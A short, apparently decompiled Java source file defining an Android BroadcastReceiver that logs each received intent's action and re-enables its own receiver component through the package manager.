package com.network.android.android.monitor;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import com.network.android.c.a.a;

public class AndroidBroadcastReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        a.a("AndroidBroadcastReceiver onReceive: " + intent.getAction());
        context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, AndroidBroadcastReceiver.class), 1, 1);
    }
}
